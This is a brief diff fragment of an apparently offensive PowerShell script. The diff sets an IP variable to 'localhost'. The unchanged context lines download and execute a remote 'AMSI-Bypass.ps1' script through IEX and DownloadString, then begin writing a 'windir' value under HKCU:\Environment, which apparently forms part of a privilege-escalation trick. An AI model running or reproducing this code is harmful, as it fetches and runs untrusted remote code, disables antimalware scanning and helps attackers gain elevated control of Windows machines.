@@ -1,4 +1,4 @@
-﻿$ip = ''
+﻿$ip = 'localhost'
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1')
 $registryPath = "HKCU:\Environment"
 $Name = "windir"
